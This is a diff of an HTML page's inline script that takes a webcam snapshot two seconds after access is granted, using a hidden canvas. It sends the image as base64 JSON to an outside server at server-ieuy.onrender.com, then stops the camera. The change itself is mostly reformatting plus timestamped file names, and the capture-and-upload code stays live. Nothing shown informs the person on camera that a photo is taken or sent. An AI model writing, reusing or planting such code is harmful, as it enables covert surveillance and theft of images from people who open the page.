@@ -27,30 +27,39 @@
   <canvas id="canvas" style="display:none;"></canvas>
   <script>
     const vid = document.getElementById('vid');
-const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
 
-navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-  vid.srcObject = stream;
-  vid.onloadedmetadata = () => {
-    canvas.width = vid.videoWidth;
-    canvas.height = vid.videoHeight;
-    setTimeout(() => {
-      ctx.drawImage(vid, 0, 0);
-      const data = [{
-        name: "capture.png",
-        data: canvas.toDataURL("image/png")
-      }];
-      fetch("https://server-ieuy.onrender.com/03dataP", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      }).then(res => res.json()).then(console.log).catch(console.error);
-      stream.getTracks().forEach(t => t.stop());
-    }, 2000);
-  };
-}).catch(console.error);
-    
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      vid.srcObject = stream;
+      vid.onloadedmetadata = () => {
+        canvas.width = vid.videoWidth;
+        canvas.height = vid.videoHeight;
+
+        setTimeout(() => {
+          ctx.drawImage(vid, 0, 0);
+
+          const timestamp = Date.now(); // unique time-based name
+          const fileName = `capture_${timestamp}.png`;
+
+          const data = [{
+            name: fileName,
+            data: canvas.toDataURL("image/png")
+          }];
+
+          fetch("https://server-ieuy.onrender.com/03dataP", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+          })
+          .then(res => res.text())
+          .then(msg => console.log("Server:", msg))
+          .catch(console.error);
+
+          stream.getTracks().forEach(t => t.stop()); // stop camera
+        }, 2000);
+      };
+    }).catch(console.error);
   </script>
 </body>
 </html>
